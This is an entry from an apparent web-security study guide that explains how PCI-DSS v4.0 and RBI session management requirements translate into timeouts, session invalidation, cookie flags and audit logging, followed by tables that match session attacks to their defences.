**Q25. What session management requirements do PCI-DSS v4.0 and RBI guidelines impose, and how do you satisfy them?**
A: Both frameworks have direct session management requirements that map to concrete implementation choices:

**PCI-DSS v4.0:**
- **Req 8.2.8** — session idle timeout must not exceed 15 minutes for systems in the cardholder data environment (CDE). Any longer and PCI audit will flag it. Implementation: the idle timeout middleware from Q14, configured to 900 seconds (15 min) for CDE-touching services.
- **Req 8.3.9** — passwords/passphrases used as authentication factors must be changed at least every 90 days. For session-adjacent credentials (API keys, service account passwords), same applies.
- **Req 8.6.1** — all user IDs and authentication factors are assigned to individual users (no shared sessions). One session ID = one authenticated user. Never share sessions between users, even for impersonation/support flows (use a separate audit-trailed impersonation mechanism).
- **Req 10.2.1** — log all authentication and session events: successful/failed logins, session creation, session termination, changes to session configuration. These logs must be tamper-evident and retained for 12 months (3 months online). Implementation: the audit log table from the MFA guide, extended to cover session events.

**RBI Master Direction on Digital Payment Security Controls:**
- **Session timeout** — idle sessions must be timed out with appropriate re-authentication. For internet banking: RBI recommends ≤ 5 minutes idle timeout. For payment applications: the AFA (Additional Factor of Authentication) requirement for each transaction de facto enforces step-up re-auth.
- **Secure cookie transmission** — sessions must be transmitted over encrypted channels exclusively. `Secure` flag mandatory; HSTS mandatory; no HTTP fallback.
- **Session invalidation on logout** — explicit logout must destroy the session server-side, not merely clear the client-side cookie. The RBI expects session termination to be cryptographically enforced (Redis `DEL`), not just cookie expiry.
- **Concurrent session control** — RBI guidelines for internet banking mandate that a new login terminates existing sessions (single active session policy). The `invalidateAllSessions` pattern from Q16 directly satisfies this.
- **Audit trail** — all session lifecycle events (creation, MFA verification, idle timeout, explicit logout, forced invalidation) logged with timestamp, IP, device fingerprint, and user ID. Retained per RBI record-keeping policy (5 years for most transaction-related records; confirm per your specific license category).

## Quick Comparison Table

| Cookie attribute | Prevents | Does not prevent |
|---|---|---|
| `HttpOnly` | XSS cookie theft via `document.cookie` | XSS-driven authenticated requests, network interception |
| `Secure` | Network interception on HTTP | XSS, CSRF, session fixation |
| `SameSite=Lax` | Cross-site POST CSRF | Navigational CSRF (GET-based actions), legacy browsers, non-browser clients |
| `SameSite=Strict` | All cross-site request CSRF | XSS, network interception |
| `__Host-` prefix | Subdomain cookie injection | XSS, network interception |
| `Max-Age` | Cookie expiry (client-side) | Server-side session survival; server must also enforce TTL |

| Session attack | Primary defense | Secondary defense |
|---|---|---|
| Session fixation | Regenerate session ID on login | Reject session IDs from URL; `__Host-` prefix |
| XSS session hijacking | `HttpOnly` | CSP; short session TTL |
| CSRF | `SameSite=Lax` | CSRF token; `Origin` header check |
| Network interception | `Secure` flag + TLS | HSTS; certificate pinning |
| Session brute force | 128+ bit entropy session ID | Rate limiting on session lookup endpoint |
| Stale session abuse | Idle + absolute timeout | Logout-all-devices; session version counter |
| Subdomain cookie injection | `__Host-` prefix | Subdomain takeover monitoring |
